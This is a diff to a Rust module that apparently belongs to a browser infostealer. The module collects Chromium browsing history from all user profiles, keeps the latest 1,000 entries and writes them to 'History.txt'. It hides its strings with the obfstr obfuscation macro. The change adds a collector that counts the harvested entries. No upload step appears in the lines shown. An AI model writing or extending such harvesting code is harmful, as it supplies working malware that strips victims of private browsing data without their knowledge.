@@ -2,6 +2,7 @@ use crate::alloc::borrow::ToOwned;
 use crate::chromium::BrowserData;
 use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, History};
 use alloc::sync::Arc;
+use collector::{Browser, Collector};
 use database::TableRecord;
 use obfstr::obfstr as s;
 use tasks::{parent_name, Task};
@@ -21,10 +22,10 @@ impl HistoryTask {
     }
 }
 
-impl Task for HistoryTask {
+impl<C: Collector> Task<C> for HistoryTask {
     parent_name!("History.txt");
 
-    unsafe fn run(&self, parent: &Path) {
+    unsafe fn run(&self, parent: &Path, collector: &C) {
         let Some(mut history) = collect_and_read_sqlite_from_all_profiles(
             &self.browser.profiles,
             |profile| profile / s!("History"),
@@ -37,6 +38,7 @@ impl Task for HistoryTask {
         history.sort_by(|a, b| b.last_visit_time.cmp(&a.last_visit_time));
         history.truncate(1000);
 
+        collector.get_browser().increase_history_by(history.len());
         let _ = to_string_and_write_all(&history, "\n\n", parent);
     }
 }
